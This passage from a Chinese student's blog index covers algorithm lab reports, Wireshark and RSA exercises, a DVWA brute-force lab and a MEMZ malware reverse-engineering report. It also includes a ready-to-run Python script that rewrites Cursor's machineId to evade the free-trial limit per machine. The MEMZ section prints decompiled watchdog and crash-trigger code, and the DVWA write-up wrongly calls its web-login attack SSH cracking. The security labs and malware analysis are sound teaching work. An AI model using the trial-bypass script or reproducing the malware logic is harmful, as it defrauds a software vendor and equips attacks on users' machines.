秒非递归求解结果：55非递归求解耗时: 0.0 秒斐波那契数列的第 20 项的计算结果如下：递归求解结果：6765递归求解耗时: 0.0 秒非递归求解结果：6765非递归求解耗时: 0.0 秒斐波那契数列的第 30 项的计算结果如下：递归求解结果：832040递归求解耗时: 0.0 秒非递归求解结果：832040非递归求解耗时: 0.0 秒斐波那契数列的第 40 项的计算结果如下：递归求解结果：102334155递归求解耗时: 0.0004742145538330078 秒非递归求解结果：102334155非递归求解耗时: 0.0 秒斐波那契数列的第 50 项的计算结果如下：递归求解结果：12586269025递归求解耗时: 0.0 秒非递归求解结果：12586269025非递归求解耗时: 0.0 秒\n\n七、出现的问题及解决方法\n\n原版斐波那契数列太慢，优化算法\n\n八、讨论、心得体会\n\n斐波那契数列的递归算法虽然简单易懂，但效率低下，时间复杂度为 O(2^n)，空间复杂度为 O(n)。非递归算法效率更高，时间复杂度为 O(n)，空间复杂度为 O(1)。\n\n实验三 贪心算法一、实验目的和要求本实验的目的是通过实现一个贪心算法来解决会议安排问题。要求是编写一个函数，能够在给定的会议开始和结束时间中，选择最多数量的会议，使得它们之间没有时间冲突。\n二、实验内容\n理解贪心算法的基本原理。\n实现一个函数来选择最多数量的会议。\n测试该函数以验证其正确性。\n\n三、主要仪器设备\n计算机\n\n四、实验方法与步骤\n分析问题：确定如何使用贪心算法来解决会议安排问题。\n设计算法：根据会议的结束时间对会议进行排序。\n实现代码：编写 Python 代码来实现该算法。\n测试代码：使用示例数据测试代码的正确性。\n\n五、主要代码def max_meetings(start_times, end_times):    # 将会议按结束时间排序    meetings = sorted(zip(start_times, end_times), key=lambda x: x[1])    # 初始化    last_end_time = 0    selected_meetings = []    # 选择会议    for start, end in meetings:        if start &gt;= last_end_time:            selected_meetings.append((start, end))            last_end_time = end    return selected_meetings# 示例输入start_times = [1, 3, 0, 5, 3, 5, 6, 8, 8, 2, 12]end_times = [4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]# 获取最大可安排会议result = max_meetings(start_times, end_times)print(&quot;可安排的会议:&quot;, result)\n\n六、实验数据处理及结果分析在实验中，我们使用了一组示例数据来测试代码。结果显示，算法能够正确选择最多数量的会议，并且这些会议之间没有时间冲突。通过对比手动计算的结果，验证了代码的正确性。\n七、出现的问题及解决方法在实现过程中，可能会遇到以下问题：\n\n问题：排序时未考虑会议的结束时间。\n\n解决方法：确保在排序时使用会议的结束时间作为关键字。\n\n\n问题：未正确更新最后一个会议的结束时间。\n\n解决方法：在每次选择会议后，更新 last_end_time 变量。\n\n\n\n八、讨论、心得体会通过本次实验，我加深了对贪心算法的理解。贪心算法在解决某些优化问题时非常有效，尤其是当问题可以分解为一系列局部最优解时。通过实践，我也体会到算法设计中细节的重要性，尤其是在处理边界条件时。\n实验四合并排序一、 实验目的和要求本实验的目的是通过实现合并排序算法，掌握分治法的基本思想和递归编程技巧。要求学生能够理解并实现合并排序算法，并对其时间复杂度和空间复杂度进行分析。\n二、 实验内容\n理论学习：学习合并排序算法的基本原理和实现方法。\n代码实现：编写合并排序算法的 Python 代码。\n测试与验证：对编写的代码进行测试，验证其正确性和效率。\n结果分析：分析排序结果，讨论算法的优缺点。\n\n三、 主要仪器设备\n计算机\nPython 编程环境\n\n四、 实验方法与步骤\n理论学习\n\n阅读教材或参考资料，了解合并排序算法的基本原理。\n理解分治法的思想和递归的实现方法。\n\n\n代码实现\n\n打开 Python 编程环境，创建一个新的 Python 文件。\n编写合并排序算法的代码，确保代码结构清晰，注释详细。\n\n\n测试与验证\n\n准备一组无序数组作为测试数据。\n运行编写的合并排序代码，对测试数据进行排序。\n验证排序结果是否正确，记录测试数据和排序结果。\n\n\n结果分析\n\n分析排序结果，讨论合并排序算法的时间复杂度和空间复杂度。\n比较合并排序与其他排序算法的优缺点，总结实验心得。\n\n\n\n五、 主要代码def merge_sort(arr):    if len(arr) &gt; 1:        mid = len(arr) // 2        left_half = arr[:mid]        right_half = arr[mid:]        merge_sort(left_half)        merge_sort(right_half)        i = j = k = 0        while i &lt; len(left_half) and j &lt; len(right_half):            if left_half[i] &lt; right_half[j]:                arr[k] = left_half[i]                i += 1            else:                arr[k] = right_half[j]                j += 1            k += 1        while i &lt; len(left_half):            arr[k] = left_half[i]            i += 1            k += 1        while j &lt; len(right_half):            arr[k] = right_half[j]            j += 1            k += 1# 测试合并排序arr = [8, 3, 2, 9, 7, 1, 5, 4]merge_sort(arr)print(&quot;排序后的数组:&quot;, arr)\n\n六、 实验数据处理及结果分析在实验过程中，我们对一组无序数组进行了合并排序。以下是实验数据和结果分析：\n\n测试数据： [8, 3, 2, 9, 7, 1, 5, 4]\n排序结果： [1, 2, 3, 4, 5, 7, 8, 9]\n\n通过对比排序前后的数组，可以看出合并排序算法成功地将无序数组排序为有序数组。合并排序的时间复杂度为 O(n log n)，空间复杂度为 O(n)。\n七、 出现的问题及解决方法在实验过程中，我们遇到了一些问题：\n\n问题：代码中存在数组索引越界的错误。解决方法：通过检查数组索引的边界条件，确保在访问数组元素时不会越界。\n\n问题：排序结果不正确。解决方法：仔细检查合并排序算法的实现，发现是由于合并过程中索引变量更新不正确导致的，修正后问题解决。\n\n\n八、 讨论、心得体会通过本次实验，我们深入理解了合并排序算法的原理和实现过程。合并排序是一种稳定的排序算法，适用于大规模数据的排序。与其他排序算法相比，合并排序的时间复杂度较低，但空间复杂度较高。在实际应用中，可以根据具体需求选择合适的排序算法。\n本次实验还让我们意识到，编写代码时需要特别注意边界条件和索引的正确性，避免出现数组越界等问题。同时，通过不断调试和修正代码，我们提高了编程能力和解决问题的能力。\n","categories":["算法设计与分析"],"tags":["算法设计与分析","实验"]},{"title":"绕过Cursor的机器绑定限制","url":"/posts/2b8fba96.html","content":"如何绕过 Cursor 免费版的机器绑定限制在使用 Cursor 免费版时，很多用户会发现，在尝试删除账号并重新注册时，仍然会受到“Too many free trial accounts used on this machine”的提示。这是因为 Cursor 会通过机器码（machineId）来限制每台机器只能绑定 3 次账号，超出次数后，删除账号、重装软件等方法都无法恢复免费试用期。\n问题原因Cursor 使用机器的唯一标识符（即 machineId）来绑定账号，每台机器在使用免费试用时，只能与三个不同的账号绑定。超过 3 次后，系统会检测到你的机器已经超过了免费试用的限制，即使你删除了账号并重新注册，机器 ID 依然存在，导致无法继续使用免费试用期。\n解决方法为了绕过这个限制，我们需要通过修改 Cursor 存储的机器 ID 来重新生成一个新的机器标识符，从而“欺骗” Cursor，让它认为这是一个全新的设备。下面是实现这一方法的详细步骤。\n操作步骤\n生成一个新的机器 ID我们需要编写一个 Python 脚本来生成新的 machineId，并更新到 storage.json 文件中。\n\nPython 代码import osimport jsonimport uuidfrom datetime import datetimeimport shutil&quot;&quot;&quot;    请以管理员身份运行 PowerShell，并执行以下命令：    python change_machine_id.py&quot;&quot;&quot;# 获取当前 Windows 用户的主目录user_home_dir = os.path.expanduser(&quot;~&quot;)storage_file = os.path.join(    user_home_dir, r&quot;AppData\\Roaming\\Cursor\\User\\globalStorage\\storage.json&quot;)print(f&quot;当前用户主目录: &#123;user_home_dir&#125;&quot;)print(f&quot;storage_file: &#123;storage_file&#125;&quot;)# 生成随机 IDdef generate_random_id():    return uuid.uuid4().hex# 获取新的 ID（从命令行参数或自动生成）def get_new_id():    import sys    return sys.argv[1] if len(sys.argv) &gt; 1 else generate_random_id()# 创建备份def backup_file(file_path):    if os.path.exists(file_path):        backup_path = f&quot;&#123;file_path&#125;.backup_&#123;datetime.now().strftime(&#x27;%Y%m%d_%H%M%S&#x27;)&#125;&quot;        shutil.copy(file_path, backup_path)        print(f&quot;已创建备份文件: &#123;backup_path&#125;&quot;)    else:        print(&quot;未找到需要备份的文件，跳过备份步骤。&quot;)# 更新或创建 JSON 文件def update_machine_id(file_path, new_id):    # 确保目录存在    os.makedirs(os.path.dirname(file_path), exist_ok=True)    # 如果文件不存在，创建一个空的 JSON 文件    if not os.path.exists(file_path):        with open(file_path, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:            json.dump(&#123;&#125;, f)    # 读取 JSON 数据    with open(file_path, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:        try:            data = json.load(f)        except json.JSONDecodeError:            data = &#123;&#125;    # 更新或添加 machineId    data[&quot;telemetry.machineId&quot;] = new_id    # 写回更新后的 JSON 文件    with open(file_path, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:        json.dump(data, f, indent=4, ensure_ascii=False)    print(f&quot;已成功修改 machineId 为: &#123;new_id&#125;&quot;)# 主函数if __name__ == &quot;__main__&quot;:    new_id = get_new_id()    # 创建备份    backup_file(storage_file)    # 更新 JSON 文件    update_machine_id(storage_file, new_id)\n\n本代码根据如何绕过Cursor的机器绑定限制_machineid 已经变了 cursor还是不能用-CSDN博客代码进行二创优化\n","categories":["cursor"],"tags":["cursor"]},{"title":"网络安全实验报告1——Wireshark抓包分析三次握手","url":"/posts/80a244c8.html","content":"网络安全原理实验 1——Wireshark 抓包分析三次握手抓包我抓的是 QFNU 官网：https://www.qfnu.edu.cn/\n找到 IPv6 地址\n\n过滤包过滤器输入以下内容过滤出 IP 地址的 tcp 协议包\nipv6.addr == 2001:250:581c:608:202:194:186:19 &amp;&amp; tcp\n\n\n分析 tcp 包第一次握手包报文数据Frame 152: 86 bytes on wire (688 bits), 86 bytes captured (688 bits) on interface \\Device\\NPF_&#123;2C528628-BD70-46E8-A2DC-6A91B43D20AE&#125;, id 0Ethernet II, Src: fe:d8:8f:31:3a:50 (fe:d8:8f:31:3a:50), Dst: Intel_1b:a7:9c (84:7b:57:1b:a7:9c)Internet Protocol Version 6, Src: 2001:250:581c:608:202:194:186:19, Dst: 2409:893d:470e:835f:fce0:9b9d:16ed:e7d9Transmission Control Protocol, Src Port: 443, Dst Port: 12882, Seq: 0, Ack: 1, Len: 0    Source Port: 443    Destination Port: 12882    [Stream index: 30]    [Conversation completeness: Complete, WITH_DATA (47)]    [TCP Segment Len: 0]    Sequence Number: 0    (relative sequence number)    Sequence Number (raw): 1574585123    [Next Sequence Number: 1    (relative sequence number)]    Acknowledgment Number: 1    (relative ack number)    Acknowledgment number (raw): 3145687753    1000 .... = Header Length: 32 bytes (8)    Flags: 0x012 (SYN, ACK)        000. .... .... = Reserved: Not set        ...0 .... .... = Accurate ECN: Not set        .... 0... .... = Congestion Window Reduced: Not set        .... .0.. .... = ECN-Echo: Not set        .... ..0. .... = Urgent: Not set        .... ...1 .... = Acknowledgment: Set        .... .... 0... = Push: Not set        .... .... .0.. = Reset: Not set        .... .... ..1. = Syn: Set        .... .... ...0 = Fin: Not set        [TCP Flags: ·······A··S·]    Window: 64800    [Calculated window size: 64800]    Checksum: 0xea7c [unverified]    [Checksum Status: Unverified]    Urgent Pointer: 0    Options: (12 bytes), Maximum segment size, No-Operation (NOP), No-Operation (NOP), SACK permitted, No-Operation (NOP), Window scale    [Timestamps]    [SEQ/ACK analysis]\n\n分析\nEthernet II：以太网 II 帧格式，包括源 MAC 地址和目的 MAC 地址。\n源 MAC 地址：fe: d8: 8f: 31: 3a: 50\n目的 MAC 地址：84: 7b: 57: 1b: a7: 9c\n\n\n**Internet Protocol Version 6 (IPv6)**：IPv6 协议，包括源 IPv6 地址和目的 IPv6 地址。\n源 IPv6 地址：2001: 250: 581c: 608: 202: 194: 186: 19\n目的 IPv6 地址：2409: 893d: 470e: 835f: fce0: 9b9d: 16ed: e7d9\n\n\n**Transmission Control Protocol (TCP)**：传输控制协议，描述了 TCP 连接的细节。\n源端口号：443\n目的端口号：12882\n序列号 (Sequence Number)：0\n确认号 (Acknowledgment Number)：1\n标志 (Flags)：SYN 和 ACK 均置位，表示这是一个带有 SYN 和 ACK 标志的握手包。\n窗口大小 (Window Size)：64800\n选项 (Options)：最大段大小 (Maximum segment size)，无操作 (NOP)，选择确认(SACK permitted)，无操作 (NOP)，窗口缩放 (Window scale)。\n时间戳 (Timestamps)：包含了时间戳选项。\n检验和 (Checksum)：0xea7c\n\n\n\n第二次握手包分析报文数据\tFrame 153: 74 bytes on wire (592 bits), 74 bytes captured (592 bits) on interface \\Device\\NPF_&#123;2C528628-BD70-46E8-A2DC-6A91B43D20AE&#125;, id 0Ethernet II, Src: Intel_1b:a7:9c (84:7b:57:1b:a7:9c), Dst: fe:d8:8f:31:3a:50 (fe:d8:8f:31:3a:50)Internet Protocol Version 6, Src: 2409:893d:470e:835f:fce0:9b9d:16ed:e7d9, Dst: 2001:250:581c:608:202:194:186:19Transmission Control Protocol, Src Port: 12882, Dst Port: 443, Seq: 1, Ack: 1, Len: 0    Source Port: 12882    Destination Port: 443    [Stream index: 30]    [Conversation completeness: Complete, WITH_DATA (47)]    [TCP Segment Len: 0]    Sequence Number: 1    (relative sequence number)    Sequence Number (raw): 3145687753    [Next Sequence Number: 1    (relative sequence number)]    Acknowledgment Number: 1    (relative ack number)    Acknowledgment number (raw): 1574585124    0101 .... = Header Length: 20 bytes (5)    Flags: 0x010 (ACK)        000. .... .... = Reserved: Not set        ...0 .... .... = Accurate ECN: Not set        .... 0... .... = Congestion Window Reduced: Not set        .... .0.. .... = ECN-Echo: Not set        .... ..0. .... = Urgent: Not set        .... ...1 .... = Acknowledgment: Set        .... .... 0... = Push: Not set        .... .... .0.. = Reset: Not set        .... .... ..0. = Syn: Not set        .... .... ...0 = Fin: Not set        [TCP Flags: ·······A····]    Window: 512    [Calculated window size: 131072]    [Window size scaling factor: 256]    Checksum: 0x94be [unverified]    [Checksum Status: Unverified]    Urgent Pointer: 0    [Timestamps]    [SEQ/ACK analysis]\n\n分析\n帧信息：\n数据长度：74字节，592位。\n源地址（Src）：Intel_1b:a7:9c (84:7b:57:1b:a7:9c)\n目标地址（Dst）：fe:d8:8f:31:3a:50\n\n\n网络协议：\nIPv6：源IP地址为2409:893d:470e:835f:fce0:9b9d:16ed:e7d9，目标IP地址为2001:250:581c:608:202:194:186:19。\n\n\n传输层协议：\nTCP：\n源端口（Src Port）：12882\n目标端口（Dst Port）：443\n序列号（Sequence Number）：1，表示本次发送的数据段序列号。\n确认号（Acknowledgment Number）：1，表示期望接收到的下一个数据段的序列号。\n标志（Flags）：ACK（Acknowledgment），表示确认号字段有效。\n窗口大小（Window）：512，表示发送端的接收缓冲区大小。\n校验和（Checksum）：0x94be。\n时间戳（Timestamps）：该选项在此包中未提供具体值。\n\n\n\n\n其他信息：\n会话完整性（Conversation completeness）：完整，有数据传输。\nTCP段长度（TCP Segment Len）：0，表示此包中未包含数据。\n\n\n\n第三次握手包报文数据Frame 161: 74 bytes on wire (592 bits), 74 bytes captured (592 bits) on interface \\Device\\NPF_&#123;2C528628-BD70-46E8-A2DC-6A91B43D20AE&#125;, id 0Ethernet II, Src: fe:d8:8f:31:3a:50 (fe:d8:8f:31:3a:50), Dst: Intel_1b:a7:9c (84:7b:57:1b:a7:9c)Internet Protocol Version 6, Src: 2001:250:581c:608:202:194:186:19, Dst: 2409:893d:470e:835f:fce0:9b9d:16ed:e7d9Transmission Control Protocol, Src Port: 443, Dst Port: 12881, Seq: 1, Ack: 808, Len: 0    Source Port: 443    Destination Port: 12881    [Stream index: 31]    [Conversation completeness: Complete, WITH_DATA (47)]    [TCP Segment Len: 0]    Sequence Number: 1    (relative sequence number)    Sequence Number (raw): 839341445    [Next Sequence Number: 1    (relative sequence number)]    Acknowledgment Number: 808    (relative ack number)    Acknowledgment number (raw): 1312419164    0101 .... = Header Length: 20 bytes (5)    Flags: 0x010 (ACK)        000. .... .... = Reserved: Not set        ...0 .... .... = Accurate ECN: Not set        .... 0... .... = Congestion Window Reduced: Not set        .... .0.. .... = ECN-Echo: Not set        .... ..0. .... = Urgent: Not set        .... ...1 .... = Acknowledgment: Set        .... .... 0... = Push: Not set        .... .... .0.. = Reset: Not set        .... .... ..0. = Syn: Not set        .... .... ...0 = Fin: Not set        [TCP Flags: ·······A····]    Window: 501    [Calculated window size: 64128]    [Window size scaling factor: 128]    Checksum: 0x220d [unverified]    [Checksum Status: Unverified]    Urgent Pointer: 0    [Timestamps]    [SEQ/ACK analysis]\n\n分析\n帧信息：\n\n数据长度：74字节，592位。\n源地址（Src）：fe:d8:8f:31:3a:50\n目标地址（Dst）：Intel_1b:a7:9c (84:7b:57:1b:a7:9c)\n\n\n网络协议：\n\nIPv6：源IP地址为2001:250:581c:608:202:194:186:19，目标IP地址为2409:893d:470e:835f:fce0:9b9d:16ed:e7d9。\n\n\n传输层协议：\n\nTCP：\n源端口（Src Port）：443\n目标端口（Dst Port）：12881\n序列号（Sequence Number）：1，表示本次发送的数据段序列号。\n确认号（Acknowledgment Number）：808，表示接收到的下一个期望的数据段序列号。\n标志（Flags）：ACK（Acknowledgment），表示确认号字段有效。\n窗口大小（Window）：501，表示发送端的接收缓冲区大小。\n校验和（Checksum）：0x220d。\n\n\n\n\n其他信息：\n\n会话完整性（Conversation completeness）：完整，有数据传输。\nTCP段长度（TCP Segment Len）：0，表示此包中未包含数据。\n\n\n\n","categories":["网络安全","实验报告"],"tags":["Wireshark","网络安全原理实验报告"]},{"title":"网络安全原理实验2——RSA算法实现与测试","url":"/posts/232a9003.html","content":"网络安全原理实验 2——RSA 算法实现与测试【目的】让学员通过该实验的练习主要掌握：\n\n实现 RSA 密码算法\n\n【环境】操作机：Ubuntu18.04\n【工具】编辑软件：gedit - Version 3.36.2\n编译器：gcc (Ubuntu 9.3.0-17ubuntu1~18.04) 9.3.0\n\n我用 Python 写的，开虚拟机，开 C 语言环境太慢了\n\n【源码】def f(r, x, n):    &quot;&quot;&quot;    计算 x 的 r 次方模 n    &quot;&quot;&quot;    a = x    b = r    c = 1    while b != 0:        while b % 2 == 0:            b = b // 2            a = (a * a) % n        if b % 2 != 0:            b = b - 1            c = (c * a) % n    return cdef Enclid(n, d):    &quot;&quot;&quot;    计算模逆运算    &quot;&quot;&quot;    a = n    b = d    t = 0    v = 1    w = 0    while True:        r = a % b        if r != 0:            q = (a - r) // b            a = b            b = r            w = v            v = t - q * v            t = w        else:            break    if b == 1:        if v &gt;= 0:            return v        else:            return n + v    else:        return 0def gcd(a, b):    &quot;&quot;&quot;    计算最大公约数    &quot;&quot;&quot;    r = a % b    while True:        r = a % b        if r != 0:            a = b            b = r        else:            break    if b == 1:        return 1    else:        return bdef rsa():    &quot;&quot;&quot;    RSA 加密算法    &quot;&quot;&quot;    # 输入两个素数 p、q    p = int(input(&quot;输入两个素数:(p、q)\\n&quot;))    q = int(input())    n = p * q  # 计算 n    fn = (p - 1) * (q - 1)  # 计算 φ(n)    # 输入 e，并确保 gcd(fn, e) = 1    e = int(input(&quot;输入e:\\n&quot;))    while True:        if gcd(fn, e) == 1:            break        else:            e = int(input(&quot;必须满足gcd(fn,e)=1\\n&quot;))    # 计算 d    d = Enclid(fn, e)    # 输出公钥和私钥    if d == 0:        print(&quot;出错了!\\n&quot;)    else:        print(&quot;公钥(%d,%d)\\n&quot; % (e, fn))        print(&quot;私钥:(%d,%d)\\n&quot; % (d, fn))        # 输入明文 m，并确保 m &lt; p * q        m = int(input(&quot;Enc: 输入明文:\\n&quot;))        while m &gt;= p * q:            print(&quot;错误！明文需要小于p*q=%d!\\n&quot; % (p * q))            m = int(input())        # 加密并输出密文        print(&quot;密文:%d\\n&quot; % f(e, m, n))        # 解密并输出明文        print(&quot;解密:m=%d\\n&quot; % f(d, f(e, m, n), n))print(&quot;RSA加密算法\\n&quot;)print(&quot;姓名: W1ndys\\n&quot;)print(&quot;学号: 10000001\\n&quot;)rsa()input(&quot;按Ctrl+C退出&quot;)\n\n【运行截图】\n","categories":["网络安全","实验报告"],"tags":["网络安全原理实验报告","RSA"]},{"title":"网络安全原理实验3——RSA签名实现","url":"/posts/6e83b201.html","content":"网络安全原理实验 3——RSA 签名实现【原理】RSA 加密是一种非对称加密。可以在不直接传递密钥的情况下，完成解密。这能够确保信息的安全性，避免了直接传递密钥所造成的被破解的风险。是由一对密钥来进行加解密的过程，分别称为公钥和私钥。两者之间有数学相关，该加密算法的原理就是对一极大整数做因数分解的困难性来保证安全性。通常个人保存私钥，公钥是公开的（可能同时多人持有）。\nRSA 签名的过程如下：\n（1）A 生成一对密钥（公钥和私钥），私钥不公开，A 自己保留。公钥为公开的，任何人可以获取。\n（2）A 用自己的私钥对消息加签，形成签名，并将加签的消息和消息本身一起传递给 B。\n（3）B 收到消息后，在获取 A 的公钥进行验签，如果验签出来的内容与消息本身一致，证明消息是 A 回复的。\n在这个过程中，只有 2 次传递过程，第一次是 A 传递加签的消息和消息本身给 B，第二次是 B 获取 A 的公钥，即使都被敌方截获，也没有危险性，因为只有 A 的私钥才能对消息进行签名，即使知道了消息内容，也无法伪造带签名的回复给 B，防止了消息内容的篡改。\n代码def func(m, e, n):    temp = 1    while e &gt; 0:        while temp &lt; n and e &gt;= 1:            temp = temp * m            e = e - 1        temp = temp % n    return tempdef main():    n = 55    d = 3  # d为私公钥13    e = 27  # e为私钥    m = int(input(&quot;请输入待签名的消息：\\n&quot;))  # 将输入转换为整数    ms = func(m, e, n)    print(&quot;签名后的消息：&quot;, ms)    vms = func(ms, d, n)    print(&quot;验证签名后的消息：&quot;, vms)    if vms == m:        print(&quot;签名验证成功！&quot;)    return 0if __name__ == &quot;__main__&quot;:    main()\n\n实验截图\n","categories":["网络安全","实验报告"],"tags":["网络安全原理实验报告","RSA"]},{"title":"网络安全实验报告4——SSH暴力破解实验","url":"/posts/97781668.html","content":"实验环境虚拟机：Kali_Linux_VMware_Workstation_16_Player_Edition工具：FoxyProxy、BurpSuit\n实验步骤安装 docker\n打开 Kali Linux，在终端输入以下命令安装 docker：\nsudo apt-get updatesudo apt-get install docker.io\n\n检查安装是否成功：\n\n\n\n部署 DVWA\n打开 Kali Linux，在终端输入以下命令部署 DVWA：\ndocker run -d --name w1ndys_dvwa -p 8081:80 vulnerables/web-dvwa\n\n打开浏览器，输入http://127.0.0.1:8081访问 DVWA。\n\n\n\n登录 DVWA\n输入用户名admin和密码password登录 DVWA。\n\n\n设置DVWA Security为Low，并点击Start启动 DVWA。\n\n\n\nFoxyProxy\n安装 FoxyProxy。\n\n\n配置代理\n\n\n\n\nBurpSuit\n设置代理\n\n\n开启拦截\n\n\n回到 DVWA，点击Login按钮，查看请求。\n\n\n抓到包信息\n\n\n添加单点爆破\n\n\n添加字典\n\n\n开始爆破\n\n观察到 password 的 length 与其他不同，疑似正确密码。\n\n尝试登录\n\n\n\n结论通过 FoxyProxy 和 BurpSuit 的组合，成功爆破 SSH 密码。\n","categories":["网络安全","实验报告"],"tags":["Wireshark","网络安全原理实验报告"]},{"title":"网络安全实验报告5——彩虹猫病毒逆向","url":"/posts/a1a5dde8.html","content":"实验工具实验平台：Hello-CTF-OS\n实验工具：IDA Pro\n病毒样本名称：geometry dash auto speedhack.exe\nMD5：19dbec50735b5f2a72d4199c4e184960\nSHA1：6fed7732f7cb6f59743795b2ab154a3676f4c822\n实验步骤运行病毒样本\n打开任务管理器，观察进程情况。\n\n\n\n运行病毒样本，观察进程情况。\n\n略\n逆向分析定位\n查一下文件信息\n\n\n\n打开 IDA Pro，导入病毒样本。\n\n定位到 start 函数，查看伪代码。\n\n\n\nstart 函数分析dword_405184 = GetSystemMetrics(0); // 获取屏幕宽度dword_405188 = GetSystemMetrics(1); // 获取屏幕高度CommandLineW = GetCommandLineW(); // 获取命令行内容v1 = CommandLineToArgvW(CommandLineW, &amp;pNumArgs);// 把 CommandLineW 转化成一个参数数组，包括命令行所有参数if ( pNumArgs &gt; 1 ) // v1 指向该函数，用于访问命令行参数//...其他代码...\n\n\n变量说明：v1 参数数组，可以访问命令行所有参数pNumArgs 参数个数\n\n根据 pNumArgs 和 v1 的内容可以把 start 函数分为三个部分：\n\nwatchdog 部分\n\nmain 部分\n\n无参数部分\n\n\n双击运行病毒样本，首先运行的是无参数部分\n无参数部分分析// 前面的代码if (MessageBoxA(        0,        &quot;The software you just executed is considered malware.\\r\\n&quot;        &quot;This malware will harm your computer and makes it unusable.\\r\\n&quot;        &quot;If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.&quot;        &quot;\\r\\n&quot;        &quot;If you know what this malware does and are using a safe environment to test, press Yes to start it.\\r\\n&quot;        &quot;\\r\\n&quot;        &quot;DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?&quot;,        &quot;MEMZ&quot;,        0x34u) == 6 &amp;&amp;    MessageBoxA(        0,        &quot;THIS IS THE LAST WARNING!\\r\\n&quot;        &quot;\\r\\n&quot;        &quot;THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\\r\\n&quot;        &quot;STILL EXECUTE IT?&quot;,        &quot;MEMZ&quot;,        0x34u) == 6)// 后面的代码\n\n很明显这是两次弹窗的内容\nMessage BoxA 是 Windows API 中的一个函数，用来弹出一个对话框。如果用户点击“是”，返回值 6\n代码继续执行的内容如下\n&#123;    v10 = (WCHAR *)LocalAlloc(0x40u, 0x4000u);    GetModuleFileNameW(0, v10, 0x2000u);    v11 = 5;    do    &#123;      ShellExecuteW(0, 0, v10, L&quot;/watchdog&quot;, 0, 10);      --v11;    &#125;    while ( v11 );    pExecInfo.cbSize = 60;    pExecInfo.lpFile = v10;    pExecInfo.lpParameters = L&quot;/main&quot;;    pExecInfo.fMask = 64;    pExecInfo.hwnd = 0;    pExecInfo.lpVerb = 0;    pExecInfo.lpDirectory = 0;    pExecInfo.hInstApp = 0;    pExecInfo.nShow = 10;    ShellExecuteExW(&amp;pExecInfo);    SetPriorityClass(pExecInfo.hProcess, 0x80u);  &#125;\n\n创建了 5 个命令行参数为 /watchdog 的进程，和 1 个命令行参数为 /main 的进程。在病毒文件执行的时候可以看到这 6 个进程。\n到此无参数部分分析完毕。\nwatchdog 部分分析函数名是看门狗？\nif ( !lstrcmpW(v1[1], L&quot;/watchdog&quot;) )    &#123;      CreateThread(0, 0, sub_40114A, 0, 0, 0);      pExecInfo.lpVerb = (LPCWSTR)48;      pExecInfo.lpParameters = (LPCWSTR)sub_401000;      pExecInfo.hIcon = (HANDLE)&quot;hax&quot;;      pExecInfo.lpFile = 0;      memset(&amp;pExecInfo.lpDirectory, 0, 28);      pExecInfo.hProcess = 0;      RegisterClassExA((const WNDCLASSEXA *)&amp;pExecInfo.lpVerb);      CreateWindowExA(0, &quot;hax&quot;, 0, 0, 0, 0, 100, 100, 0, 0, 0, 0);      while ( GetMessageW(&amp;Msg, 0, 0, 0) &gt; 0 )      &#123;        TranslateMessage(&amp;Msg);        DispatchMessageW(&amp;Msg);      &#125;    &#125;\n\n创建了一个线程，并在线程中调用了 sub_40114A 函数。还出现了sub_401000 函数\nsub_40114A 函数分析跟进函数看看里面发生了什么\nvoid __stdcall __noreturn sub_40114A(LPVOID lpThreadParameter)&#123;    HANDLE CurrentProcess;     // eax    HANDLE Toolhelp32Snapshot; // edi    const CHAR *v3;            // ebx    int v4;                    // esi    PROCESSENTRY32W pe;        // [esp+Ch] [ebp-23Ch] BYREF    LPCSTR lpString1;          // [esp+238h] [ebp-10h]    int v7;                    // [esp+23Ch] [ebp-Ch]    LPCSTR lpString2;          // [esp+240h] [ebp-8h]    HANDLE hObject;            // [esp+244h] [ebp-4h]    v7 = 0;    lpString1 = (LPCSTR)LocalAlloc(0x40u, 0x200u);    CurrentProcess = GetCurrentProcess();    GetProcess../images/CyberSecurity/5-cat/imageFileNameA(CurrentProcess, lpString1, 512);    Sleep(0x3E8u);    while (1) // 死循环    &#123;        Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); // 获取进程快照        pe.dwSize = 556;        Process32FirstW(Toolhelp32Snapshot, &amp;pe);        v3 = lpString1;        v4 = 0;        do // 遍历进程列表        &#123;            hObject = OpenProcess(0x400u, 0, pe.th32ProcessID);            lpString2 = (LPCSTR)LocalAlloc(0x40u, 0x200u);            GetProcess../images/CyberSecurity/5-cat/imageFileNameA(hObject, lpString2, 512);            if (!lstrcmpA(v3, lpString2)) // 如果进程名相同,v4+1                ++v4;            CloseHandle(hObject);            LocalFree((HLOCAL)lpString2);        &#125; while (Process32NextW(Toolhelp32Snapshot, &amp;pe));        CloseHandle(Toolhelp32Snapshot);        if (v4 &lt; v7) // 如果进程数v4&lt;v7,执行`sub_401021`函数            sub_401021();        v7 = v4;        Sleep(0xAu);    &#125;&#125;\n\n首先是一个 while(1)死循环，首先获取系统快照，然后遍历快照每一个进程，比较进程名字是否相同，如果相同，v4+1。如果 v4&lt;v7，则调用sub_401021函数。\n\n总的来说，这个函数是用来监控系统进程的变化，可以检测无参数部分开启的进程是否被关闭。如果检测到少于 6 个进程，则调用sub_401021函数。\n\nsub_401021 函数分析继续看看sub_401021函数\nBOOL __usercall sub_401021 @&lt;eax&gt;(int a1 @&lt;ebp&gt;)&#123;    int v1;                                                             // esi    int v2;                                                             // esi    HMODULE LibraryA;                                                   // edi    FARPROC RtlAdjustPrivilege;                                         // ebx    FARPROC NtRaiseHardError;                                           // eax    void(__cdecl * v6)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // esi    HANDLE CurrentProcess;                                              // eax    int v9;                                                             // [esp-20h] [ebp-28h]    struct _TOKEN_PRIVILEGES v10;                                       // [esp-18h] [ebp-20h] BYREF    int v11;                                                            // [esp-8h] [ebp-10h] BYREF    HANDLE v12;                                                         // [esp-4h] [ebp-Ch] BYREF    int v13;                                                            // [esp+0h] [ebp-8h] BYREF    int v14;                                                            // [esp+4h] [ebp-4h]    v1 = 20;    do // 循环创建20个进程，随机出现在屏幕任意位置    &#123;        CreateThread(0, 0x1000u, StartAddress, 0, 0, 0);        Sleep(0x64u);        --v1;    &#125; while (v1);    v2 = v14;    v14 = a1;    v9 = v2;    LibraryA = LoadLibraryA(&quot;ntdll&quot;);    RtlAdjustPrivilege = 